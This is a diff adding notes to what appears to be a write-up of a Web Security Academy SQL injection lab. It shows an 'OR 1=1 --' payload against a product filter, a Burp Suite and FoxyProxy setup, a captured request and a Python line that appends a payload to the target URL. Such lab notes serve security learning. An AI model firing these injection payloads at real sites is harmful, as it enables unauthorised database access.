@@ -80,3 +80,43 @@ SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
 ```
 
 SUCCESS!
+
+> The Burp Suite (written in Java, by the way) acts as an 
+intermediary between the browser and the web server where
+the application is hosted.
+
+- **FoxyProxy** allows you to enable proxies by patterns and
+order with the Burp suite:
+
+(_Edit Proxy Burp_)
+
+Proxy Type ---> HTTP  
+Proxy IP address or DNS name ---> 127.0.0.1  
+Port ---> 8080  
+Username ---> username  
+Password ---> pswd
+
+Proxy > Send to Repeater > Repeater > RAW:
+
+```
+GET /filter?category=Accessories HTTP/1.1
+Host: ...
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0)
+Gecko/20100101 Firefox/78.0
+Accept:
+text/html, application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US, en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: (this is the target URL)
+https://...web-security-academy.net/
+Cookie: session=mc1241r398ygei8u912urgf
+Upgrade-Insecure-Requests:1
+```
+
+By using FoxyProxy + Burp, we are able to track the **URI**:
+`/filter?category=`
+
+```python
+r = request.get(url + uri + payload)
+```
